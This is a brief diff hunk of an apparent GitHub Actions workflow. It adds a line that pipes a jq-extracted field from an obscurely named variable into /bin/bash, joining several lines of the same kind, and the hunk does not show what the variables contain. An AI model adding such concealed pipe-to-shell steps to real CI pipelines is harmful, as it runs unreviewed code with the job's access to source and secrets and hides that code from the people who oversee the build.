@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$o912" | jq -r .ihw9741 | /bin/bash
           echo $pwyla7 | jq -r .tfhrf5 | /bin/bash
           printf '%s' "$c37" | jq -r .sm43 | /bin/bash
+          echo $pgilv7554 | jq -r .k50 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
